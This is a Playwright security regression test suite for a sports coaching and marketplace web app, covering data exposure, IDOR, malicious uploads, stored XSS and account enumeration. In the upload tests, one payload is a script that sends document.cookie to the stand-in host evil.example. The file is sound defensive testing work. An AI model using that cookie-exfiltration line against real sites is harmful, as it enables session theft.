import { test, expect } from '@playwright/test';
import { registerPlayer, registerCoach, login } from '../helpers/auth';
import { approveUser, hideUserAsAdmin } from '../helpers/messages';
import { completePlayerProfile, completeCoachProfile } from '../helpers/profile';
import { TEST_USERS, uniqueTestEmail } from '../fixtures/test-users';
import { skipUnlessUploadsAllowed } from '../helpers/staging-gates';

/*
  Security regression suite - not "does the feature work", but "does
  the thing we already found and fixed stay fixed". Two vulnerability
  classes, each with its own describe block:

  1. Sensitive-field exposure (SEC-001/002): a public profile response
     must never include password/email/isAdmin/isApproved/isTestUser/
     isHidden/status/emailVerified/emailVerifiedAt - see
     server/lib/sanitizeUser.ts's toPublicUser().

  2. IDOR on the marketplace (SEC-003..006): every mutating marketplace
     endpoint must verify the caller owns the item, not just that
     they're logged in - see the and(eq(id), eq(userId)) pattern in
     server/storage.ts's marketplace methods.

  Both SEC-001 and SEC-003 are @smoke - these are exactly the two
  classes of bug this session shipped fixes for, so a regression here
  is the highest-value thing this suite can catch on every deploy.
*/

// Fields that must NEVER appear in a response about someone ELSE's
// account - see server/lib/sanitizeUser.ts toPublicUser().
const FORBIDDEN_PUBLIC_USER_FIELDS = [
  'password',
  'email',
  'isAdmin',
  'isApproved',
  'isTestUser',
  'isHidden',
  'status',
  'emailVerified',
  'emailVerifiedAt',
  // Login-lockout state (public user is an allowlist since 29 Oct).
  'failedLoginAttempts',
  'lockedUntil',
];

function assertNoForbiddenFields(user: Record<string, unknown>, context: string) {
  const leaked = FORBIDDEN_PUBLIC_USER_FIELDS.filter((field) => field in user);
  expect(leaked, `${context} leaked forbidden field(s): ${leaked.join(', ')}`).toEqual([]);
}

test.describe('Security: public profile data exposure', () => {
  test('@smoke SEC-001 Public player profile never exposes password hash or internal fields', async ({ page }) => {
    const player = await registerPlayer(page);
    await completePlayerProfile(page);

    const meRes = await page.request.get('/api/auth/me');
    const me = await meRes.json();

    const res = await page.request.get(`/api/players/${me.slug}`);
    expect(res.ok()).toBeTruthy();
    const data = await res.json();

    assertNoForbiddenFields(data.user, 'GET /api/players/:slug');

    // Positive check too - a response that leaked nothing because it
    // ALSO stopped returning real data would silently pass the check
    // above for the wrong reason.
    expect(data.user.name).toBeTruthy();
    expect(data.user.slug).toBe(me.slug);
  });

  test('@smoke SEC-002 Public coach profile never exposes password hash or internal fields', async ({ page }) => {
    await registerCoach(page);
    await completeCoachProfile(page);

    const meRes = await page.request.get('/api/auth/me');
    const me = await meRes.json();

    const res = await page.request.get(`/api/coaches/${me.slug}`);
    expect(res.ok()).toBeTruthy();
    const data = await res.json();

    assertNoForbiddenFields(data.user, 'GET /api/coaches/:slug');
    expect(data.user.name).toBeTruthy();
    expect(data.user.slug).toBe(me.slug);
  });

  test('SEC-002b Incomplete player profile still never exposes internal fields', async ({ page }) => {
    // Registered but deliberately never completed the profile wizard -
    // the exact case that motivated relaxing the 404 in the first
    // place (see server/routes/players.ts). Still must never leak.
    await registerPlayer(page);

    const meRes = await page.request.get('/api/auth/me');
    const me = await meRes.json();

    const res = await page.request.get(`/api/players/${me.slug}`);
    expect(res.ok()).toBeTruthy();
    const data = await res.json();

    assertNoForbiddenFields(data.user, 'GET /api/players/:slug (incomplete profile)');
    expect(data.user.name).toBeTruthy();
  });
});

test.describe('Security: coach contact details', () => {
  // server/lib/publicProfiles.ts: GET /api/coaches/:slug sends phone/email
  // (in `contact`, never in `profile`) only to the coach, admins and
  // approved accounts. Values are run-owned test data, never printed.
  test('SEC-011 Coach contact details reach the coach and approved accounts only, never guests or unapproved accounts', async ({ page, browser }) => {
    test.slow(); // four accounts in one flow

    // ---------- Test data ----------

    await registerCoach(page);
    await completeCoachProfile(page);
    const me = await (await page.request.get('/api/auth/me')).json();
    const phone = `+61 4${String(Date.now()).slice(-8)}`;
    const contactEmail = uniqueTestEmail('coach-contact');
    const saved = await page.request.put('/api/me/coach-profile', { data: { phone, email: contactEmail } });
    expect(saved.ok()).toBeTruthy();
    const url = `/api/coaches/${me.slug}`;
    const hasContact = (text: string) => text.includes(phone) || text.includes(contactEmail);

    // ---------- Verify (the coach) ----------

    const own = await (await page.request.get(url)).json();
    expect(own.contactAccess).toBe('granted');
    expect(own.contact).toEqual({ phone, email: contactEmail });
    expect(Object.keys(own.profile)).not.toContain('phone');
    expect(Object.keys(own.profile)).not.toContain('email');

    const guest = await browser.newContext();
    const unapproved = await browser.newContext();
    const approved = await browser.newContext();
    const admin = await browser.newContext();
    try {

      // Others only see a coach whose profile is public (approved by an
      // admin) - before that it is a 404 for them (SEC-012).
      await approveUser(await admin.newPage(), TEST_USERS.admin.email, TEST_USERS.admin.password, me.id);

      // ---------- Verify (guest) ----------

      const guestRes = await guest.request.get(url);
      expect(guestRes.ok()).toBeTruthy();
      const guestText = await guestRes.text();
      expect(hasContact(guestText), 'guest response carries the contact details').toBeFalsy();
      expect(guestText).not.toContain(me.email);
      expect(JSON.parse(guestText)).toMatchObject({ contact: null, contactAccess: 'sign-in' });

      // ---------- Verify (signed in, not approved yet) ----------

      const unapprovedPage = await unapproved.newPage();
      await registerPlayer(unapprovedPage);
      const pendingText = await (await unapprovedPage.request.get(url)).text();
      expect(hasContact(pendingText), 'unapproved account sees the contact details').toBeFalsy();
      expect(JSON.parse(pendingText)).toMatchObject({ contact: null, contactAccess: 'pending-approval' });
      await unapprovedPage.goto(`/coach/${me.slug}?tab=contact`);
      await expect(unapprovedPage.getByTestId('coach-contact-pending-approval')).toBeVisible({ timeout: 15000 });
      await expect(unapprovedPage.getByTestId('coach-contact-details')).toHaveCount(0);

      // ---------- Verify (approved account) ----------

      const approvedPage = await approved.newPage();
      await login(approvedPage, TEST_USERS.player.email, TEST_USERS.player.password);
      const granted = await (await approvedPage.request.get(url)).json();
      expect(granted.contactAccess).toBe('granted');
      expect(granted.contact).toEqual({ phone, email: contactEmail });
      await approvedPage.goto(`/coach/${me.slug}?tab=contact`);
      await expect(approvedPage.getByTestId('coach-contact-details')).toBeVisible({ timeout: 15000 });

      // ---------- Final verification ----------

      // The directory never carries them, for anyone.
      for (const context of [guest, approved]) {
        const listText = await (await context.request.get('/api/coaches?page=1&limit=100')).text();
        expect(hasContact(listText), 'directory list carries contact details').toBeFalsy();
      }
    } finally {
      await Promise.all([guest.close(), unapproved.close(), approved.close(), admin.close()]);
    }
  });

  // Same visibility rule for the directory and GET /api/coaches/:slug
  // (server/lib/publicProfiles.ts isCoachPubliclyVisible).
  test('SEC-012 Unapproved and hidden coach profiles are a 404 for guests and members, but not for the coach or admins', async ({ page, browser }) => {
    test.slow(); // four accounts, two admin actions

    // ---------- Test data ----------

    const coach = await registerCoach(page);
    await completeCoachProfile(page);
    const me = await (await page.request.get('/api/auth/me')).json();
    const url = `/api/coaches/${me.slug}`;
    const listed = async (request: import('@playwright/test').APIRequestContext) => {
      const body = await (await request.get(`/api/coaches?page=1&limit=100&q=${encodeURIComponent(coach.name)}`)).json();
      return (body.coaches as { id: string }[]).some((c) => c.id === me.id);
    };

    const guest = await browser.newContext();
    const member = await browser.newContext();
    const admin = await browser.newContext();
    try {
      const memberPage = await member.newPage();
      await login(memberPage, TEST_USERS.player.email, TEST_USERS.player.password);
      const adminPage = await admin.newPage();

      // ---------- Verify (new coach: completed, not approved yet) ----------

      expect((await guest.request.get(url)).status(), 'guest, unapproved coach').toBe(404);
      expect((await memberPage.request.get(url)).status(), 'approved member, unapproved coach').toBe(404);
      expect((await page.request.get(url)).status(), 'the coach').toBe(200);
      expect(await listed(guest.request), 'unapproved coach in the directory').toBeFalsy();
      const guestPage = await guest.newPage();
      await guestPage.goto(`/coach/${me.slug}`);
      await expect(guestPage).toHaveURL(/\/coaches$/, { timeout: 15000 });

      // ---------- Actions (admin approves) ----------

      await approveUser(adminPage, TEST_USERS.admin.email, TEST_USERS.admin.password, me.id);

      // ---------- Verify (approved: public) ----------

      expect((await guest.request.get(url)).status(), 'guest, approved coach').toBe(200);
      expect(await listed(guest.request), 'approved coach in the directory').toBeTruthy();

      // ---------- Actions (admin hides) ----------

      await hideUserAsAdmin(adminPage, TEST_USERS.admin.email, TEST_USERS.admin.password, me.id);

      // ---------- Final verification (hidden) ----------

      expect((await guest.request.get(url)).status(), 'guest, hidden coach').toBe(404);
      expect((await memberPage.request.get(url)).status(), 'member, hidden coach').toBe(404);
      expect(await listed(guest.request), 'hidden coach in the directory').toBeFalsy();
      expect((await page.request.get(url)).status(), 'the coach, own hidden profile').toBe(200);
      expect((await adminPage.request.get(url)).status(), 'admin, hidden coach').toBe(200);
    } finally {
      await Promise.all([guest.close(), member.close(), admin.close()]);
    }
  });
});

test.describe('Security: marketplace IDOR', () => {
  async function createMarketplaceItem(page: import('@playwright/test').Page, title: string) {
    const res = await page.request.post('/api/profile/marketplace', {
      data: {
        title,
        price: '50',
        condition: 'Used',
        location: 'Sydney, NSW',
      },
    });
    expect(res.ok()).toBeTruthy();
    return res.json();
  }

  test('@smoke SEC-003 A marketplace item cannot be deleted by anyone other than its owner', async ({ page, browser }) => {
    await registerPlayer(page);
    const item = await createMarketplaceItem(page, `Owner-only racquet ${Date.now()}`);

    const otherContext = await browser.newContext();
    const otherPage = await otherContext.newPage();
    try {
      await registerPlayer(otherPage);

      const deleteRes = await otherPage.request.delete(`/api/profile/marketplace/${item.id}`);
      expect(deleteRes.status()).toBe(404);

      // The item must still exist for its real owner afterwards - a
      // 404 that quietly still deleted the row would be just as bad.
      const stillThereRes = await page.request.get('/api/profile/marketplace');
      const myItems = await stillThereRes.json();
      expect(myItems.some((i: any) => i.id === item.id)).toBe(true);
    } finally {
      await otherContext.close();
    }
  });

  test('SEC-004 A marketplace item cannot be edited by anyone other than its owner', async ({ page, browser }) => {
    await registerPlayer(page);
    const item = await createMarketplaceItem(page, `Owner-only string set ${Date.now()}`);

    const otherContext = await browser.newContext();
    const otherPage = await otherContext.newPage();
    try {
      await registerPlayer(otherPage);

      const putRes = await otherPage.request.put(`/api/profile/marketplace/${item.id}`, {
        data: { title: 'Hijacked title', price: '1' },
      });
      expect(putRes.status()).toBe(404);

      const myItemsRes = await page.request.get('/api/profile/marketplace');
      const myItems = await myItemsRes.json();
      const stillMine = myItems.find((i: any) => i.id === item.id);
      expect(stillMine?.title).toBe(item.title);
    } finally {
      await otherContext.close();
    }
  });

  test("SEC-004b A listing's ownership cannot be reassigned via the update payload, even by its real owner", async ({ page, browser }) => {
    await registerPlayer(page);
    const item = await createMarketplaceItem(page, `Non-transferable listing ${Date.now()}`);

    const otherContext = await browser.newContext();
    const otherPage = await otherContext.newPage();
    let otherUserId: string;
    try {
      await registerPlayer(otherPage);
      const otherMeRes = await otherPage.request.get('/api/auth/me');
      otherUserId = (await otherMeRes.json()).id;
    } finally {
      await otherContext.close();
    }

    // The real owner tries to smuggle a new userId into an otherwise
    // legitimate update - the allowlist in updateMarketplaceItem must
    // silently ignore it, not honour it.
    const putRes = await page.request.put(`/api/profile/marketplace/${item.id}`, {
      data: { title: 'Still mine', userId: otherUserId },
    });
    expect(putRes.ok()).toBeTruthy();

    const myItemsRes = await page.request.get('/api/profile/marketplace');
    const myItems = await myItemsRes.json();
    expect(myItems.some((i: any) => i.id === item.id)).toBe(true);
  });

  test('SEC-005 Photos cannot be added to or removed from a marketplace item by a non-owner', async ({ page, browser }) => {
    await registerPlayer(page);
    const item = await createMarketplaceItem(page, `Owner-only photos item ${Date.now()}`);

    const otherContext = await browser.newContext();
    const otherPage = await otherContext.newPage();
    try {
      await registerPlayer(otherPage);

      const removeRes = await otherPage.request.delete(`/api/profile/marketplace/${item.id}/photos`, {
        data: { photoUrl: 'https://example.com/whatever.webp' },
      });
      expect(removeRes.status()).toBe(404);
    } finally {
      await otherContext.close();
    }
  });
});

test.describe('Security: malicious file upload rejection', () => {
  // A real image file starts with a specific magic-number byte
  // sequence (see server/lib/imageValidation.ts detectImageType) - a
  // plain text/HTML payload never matches any of them, regardless of
  // what filename or Content-Type the client claims for it. Every one
  // of these attempts declares itself as a legitimate image on the
  // wire (name "evil.webp", mimeType "image/webp") while the actual
  // bytes are an HTML/script payload - exactly what an attacker
  // uploading a disguised file would send.
  const disguisedHtmlPayload = Buffer.from('<script>document.location="https://evil.example/steal?c="+document.cookie</script>');

  test('@smoke SEC-007 Marketplace photo upload rejects a disguised non-image file', async ({ page }) => {
    // Uploads write to Supabase Storage: off on Staging until isolation is verified.
    skipUnlessUploadsAllowed();
    await registerPlayer(page);
    const itemRes = await page.request.post('/api/profile/marketplace', {
      data: { title: `Upload test item ${Date.now()}`, price: '10', condition: 'Used', location: 'Sydney, NSW' },
    });
    const item = await itemRes.json();

    const uploadRes = await page.request.post(`/api/profile/marketplace/${item.id}/photos`, {
      multipart: {
        file: { name: 'evil.webp', mimeType: 'image/webp', buffer: disguisedHtmlPayload },
      },
    });
    expect(uploadRes.status()).toBe(400);
  });

  test('SEC-008 Tournament history photo upload rejects a disguised non-image file', async ({ page }) => {
    // Uploads write to Supabase Storage: off on Staging until isolation is verified.
    skipUnlessUploadsAllowed();
    await registerPlayer(page);
    const entryRes = await page.request.post('/api/profile/tournament-history', {
      data: { name: `Upload test tournament ${Date.now()}`, location: 'Sydney, NSW', date: '2026-01-01' },
    });
    const entry = await entryRes.json();

    const uploadRes = await page.request.post(`/api/profile/tournament-history/${entry.id}/photos`, {
      multipart: {
        file: { name: 'evil.webp', mimeType: 'image/webp', buffer: disguisedHtmlPayload },
      },
    });
    // This route's error path currently surfaces any thrown Error as a
    // generic 500 rather than a mapped 400 (see the route's plain
    // catch(e) { next(e) }) - the one thing that actually matters for
    // this test is that it's rejected, not stored as a "photo".
    expect(uploadRes.ok()).toBeFalsy();

    const stillThereRes = await page.request.get(`/api/profile/tournament-history?userId=${entry.userId}`);
    const entries = await stillThereRes.json();
    const stored = entries.find((e: any) => e.id === entry.id);
    expect(stored?.photos ?? []).toHaveLength(0);
  });
});

test.describe('Security: stored XSS is neutralised on render', () => {
  // React escapes text children by default (it renders a <script> tag
  // in a bio as inert TEXT, never as markup that gets parsed) - this
  // is what actually protects the app, not any server-side stripping
  // of the input. These tests check the rendered PAGE for a stored
  // payload, not just that the API accepted/returned it, since storing
  // the raw string is expected and correct; only the render matters.
  const xssPayload = `<script>window.__xssFired = true;</script>`;

  test('@smoke SEC-010 A script tag saved in a player bio never executes when the profile is viewed', async ({ page }) => {
    await registerPlayer(page);
    await completePlayerProfile(page);

    const meRes = await page.request.get('/api/auth/me');
    const me = await meRes.json();

    const updateRes = await page.request.put('/api/me/player-profile', {
      data: { bio: xssPayload },
    });
    expect(updateRes.ok()).toBeTruthy();

    await page.goto(`/player/${me.slug}`);

    // If the payload had actually executed as script, this flag would
    // be set on the page's own window object.
    const fired = await page.evaluate(() => (window as any).__xssFired);
    expect(fired).toBeUndefined();

    // And it should still be visible as plain, inert text somewhere on
    // the page - proving it was rendered, not silently dropped (a bio
    // that just vanished would also make the __xssFired check above
    // pass for the wrong reason).
    await expect(page.getByText('window.__xssFired', { exact: false })).toBeVisible();
  });
});

test.describe('Security: registration does not leak whether an email is already taken', () => {
  test('@smoke SEC-009 Registering with an already-used email gets the exact same response as a real new signup', async ({ page }) => {
    const email = uniqueTestEmail('sec009');
    const payload = { email, password: 'Test123456!', name: 'Sec Test', role: 'player' };

    const firstRes = await page.request.post('/api/auth/register', { data: payload });
    expect(firstRes.status()).toBe(201);
    const firstBody = await firstRes.json();

    // Second attempt, same email - must be indistinguishable from the
    // first: same status, same message, same requiresVerification
    // flag. No "Email already exists", nothing that lets the caller
    // tell these two responses apart.
    const secondRes = await page.request.post('/api/auth/register', {
      data: { ...payload, name: 'Someone Else' },
    });
    expect(secondRes.status()).toBe(firstRes.status());
    const secondBody = await secondRes.json();
    expect(secondBody).toEqual(firstBody);
    expect(JSON.stringify(secondBody).toLowerCase()).not.toContain('already');
  });
});

test.describe('Security: tournament history ownership (regression - already correct, locking it in)', () => {
  async function createTournamentEntry(page: import('@playwright/test').Page, name: string) {
    const res = await page.request.post('/api/profile/tournament-history', {
      data: { name, location: 'Sydney, NSW', date: '2026-01-01', result: 'Winner' },
    });
    expect(res.ok()).toBeTruthy();
    return res.json();
  }

  test('SEC-006 A tournament history entry cannot be edited or deleted by anyone other than its owner', async ({ page, browser }) => {
    await registerPlayer(page);
    const entry = await createTournamentEntry(page, `Owner-only tournament ${Date.now()}`);

    const otherContext = await browser.newContext();
    const otherPage = await otherContext.newPage();
    try {
      await registerPlayer(otherPage);

      const putRes = await otherPage.request.put(`/api/profile/tournament-history/${entry.id}`, {
        data: { name: 'Hijacked' },
      });
      // This route doesn't have its own 404 mapping the way the
      // marketplace ones were just given - the ownership check still
      // throws and blocks the write, it just surfaces as a generic
      // 500 today. The one thing this test cares about either way:
      // never a success, and the entry is never actually changed.
      expect(putRes.ok()).toBeFalsy();

      const deleteRes = await otherPage.request.delete(`/api/profile/tournament-history/${entry.id}`);
      expect(deleteRes.ok()).toBeFalsy();
    } finally {
      await otherContext.close();
    }
  });
});
